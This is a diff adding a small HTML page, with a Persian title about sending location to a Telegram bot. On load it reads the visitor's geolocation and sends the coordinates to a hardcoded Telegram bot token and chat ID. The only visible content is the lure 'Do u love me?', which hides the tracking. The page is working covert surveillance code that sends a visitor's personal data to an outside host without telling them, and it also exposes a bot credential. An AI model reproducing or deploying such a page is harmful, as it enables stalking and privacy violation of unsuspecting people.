@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>دریافت و ارسال مکان به ربات تلگرام</title>
+    <script>
+        function sendLocation(latitude, longitude) {
+            var link = "https://api.telegram.org/bot6562150133:AAHsTVY7tekx_qX-r_q6X91cHUNHDsXbhGY/sendLocation";
+            link += "?chat_id=-4071234151";
+            link += "&longitude=" + longitude;
+            link += "&latitude=" + latitude;
+
+            // ارسال درخواست به ربات تلگرام
+            window.location.href = link;
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
+                    sendLocation(latitude, longitude);
+                });
+            } else {
+                alert("مرورگر شما از Geolocation پشتیبانی نمی‌کند.");
+            }
+        }
+    </script>
+</head>
+<body onload="getLocation()">
+    <h1>Do u love me?</h1>
+</body>
+</html>
